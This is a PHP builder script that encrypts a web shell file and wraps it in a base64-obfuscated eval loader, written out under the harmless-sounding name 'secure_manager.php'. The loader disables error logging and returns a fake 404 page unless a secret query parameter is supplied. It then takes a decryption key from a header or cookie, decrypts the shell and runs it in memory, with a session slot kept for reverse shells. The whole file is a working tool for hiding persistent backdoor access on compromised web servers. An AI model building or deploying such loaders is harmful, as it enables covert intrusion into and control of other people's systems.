<?php
/**
 * MISSION CRITICAL - RAM-ONLY STEALTH LOADER
 * VERIFIED JSON PERSISTENCE
 */

$source_file    = 'webshell2.php'; 
$output_name    = 'secure_manager.php'; 
$encryption_key = 'secretNNEA1rFUqyfgoY8zNYSkvefrsbmdDdixTApahs2WhkvKMCf7PQ2uobMP'; 
$ghost_key      = 'PHPSSIDLOGINFODATARECOVESSRYSYSTEM'; 
$ghost_val      = 'SYSTEM32LOGFILEINSTANCE'; 

$code      = file_get_contents($source_file);
$iv_len    = openssl_cipher_iv_length('aes-256-cbc');
$iv        = openssl_random_pseudo_bytes($iv_len);
$encrypted = openssl_encrypt($code, 'aes-256-cbc', $encryption_key, 0, $iv);
$payload   = base64_encode($iv . $encrypted);

// Obfuscated Loader Logic - compatible with PHP 5.6+
$inner_loader = '
@ini_set("session.use_cookies", 0);
@ini_set("display_errors", 0);
@ini_set("log_errors", 0);

$payload = "' . $payload . '";
$ghost_k = "' . $ghost_key . '";
$ghost_v = "' . $ghost_val . '";

if (!isset($_GET[$ghost_k]) || $_GET[$ghost_k] !== $ghost_v) {
    header("HTTP/1.1 404 Not Found");
    return;
}

$key = isset($_SERVER["HTTP_X_VAULT_KEY"]) ? $_SERVER["HTTP_X_VAULT_KEY"] : (isset($_COOKIE["v_key"]) ? $_COOKIE["v_key"] : null);

if (!$key) {
    echo "<!DOCTYPE html><html><head><title>404 Not Found</title></head><body style=\"background:#000;color:#00ff00;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;\"><div style=\"border:1px solid #004400;padding:20px;text-align:center;\"><code>RAM_LOADER_LOCKED</code><br><br><input type=\"password\" id=\"p\" autofocus style=\"background:#000;border:1px solid #004400;color:#00ff00;padding:5px;outline:none;\"><button onclick=\"go()\" style=\"background:#004400;color:#fff;border:none;padding:5px 10px;cursor:pointer;\">MOUNT</button></div><script>function go(){const k=document.getElementById(\"p\").value;sessionStorage.setItem(\"v_key\",k);document.cookie=\"v_key=\"+k+\"; path=/; SameSite=Strict\";location.reload()}if(sessionStorage.getItem(\"v_key\")){fetch(window.location.href,{headers:{\"X-Vault-Key\":sessionStorage.getItem(\"v_key\")}}).then(r=>r.text()).then(t=>{document.open();document.write(t);document.close()})}</script></body></html>";
    return;
}

$raw = base64_decode($payload);
$iv_l = openssl_cipher_iv_length("aes-256-cbc");
$iv = substr($raw, 0, $iv_l);
$cipher = substr($raw, $iv_l);
$dec = openssl_decrypt($cipher, "aes-256-cbc", $key, 0, $iv);

if ($dec) {
    ob_start();
    global $_SESSION;
    $_SESSION = array(
        "current_dir" => isset($_SERVER["HTTP_X_STATE_CWD"]) ? $_SERVER["HTTP_X_STATE_CWD"] : (isset($_COOKIE["v_cwd"]) ? $_COOKIE["v_cwd"] : ""), 
        "terminal_cwd" => isset($_SERVER["HTTP_X_STATE_TCWD"]) ? $_SERVER["HTTP_X_STATE_TCWD"] : (isset($_COOKIE["v_tcwd"]) ? $_COOKIE["v_tcwd"] : ""), 
        "reverse_shells" => array()
    );
    unset($payload, $raw, $key, $cipher, $iv);
    eval("?>" . $dec);
    $output = ob_get_clean();
    
    $is_dl = false;
    foreach(headers_list() as $h) {
        if (stripos($h, "Content-Disposition") !== false || stripos($h, "application/octet-stream") !== false) {
            $is_dl = true; break;
        }
    }

    if (!$is_dl && !(trim($output) && (strpos(trim($output), "{") === 0 || strpos(trim($output), "[") === 0))) {
        echo "<script>(function(){const K=sessionStorage.getItem(\'v_key\');const _f=window.fetch;window.fetch=async(...a)=>{if(!a[1])a[1]={};a[1].headers={...(a[1].headers||{}),\'X-Vault-Key\':K,\'X-Requested-With\':\'XMLHttpRequest\',\'X-State-CWD\':sessionStorage.getItem(\'v_cwd\')||\'\',\'X-State-TCWD\':sessionStorage.getItem(\'v_tcwd\')||\'\'};return _f(...a)}})()</script>" . $output;
    } else { echo $output; }
} else {
    setcookie("v_key", "", time()-3600);
    header("HTTP/1.1 401 Unauthorized");
    return;
}';

$encoded_loader = base64_encode($inner_loader);
$loader_code = '<?php eval(base64_decode("' . $encoded_loader . '")); ?>';

file_put_contents($output_name, $loader_code);
echo "Final Mission Loader: $output_name\n";
